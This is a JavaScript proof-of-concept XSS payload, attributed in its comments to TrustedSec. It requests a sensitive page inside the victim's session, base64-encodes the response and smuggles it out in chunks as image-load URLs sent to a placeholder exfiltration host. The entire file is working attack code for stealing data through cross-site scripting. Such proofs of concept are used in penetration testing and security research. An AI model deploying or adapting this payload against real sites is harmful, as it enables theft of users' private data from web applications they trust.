// TrustedSec Proof-of-Concept to steal 
// sensitive data through XSS payload


function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}




function stealData()
{
	var uri = "/app/superSecretData.html";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);


			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://127.0.0.1/exfil/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = "http://127.0.0.1/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}



stealData();
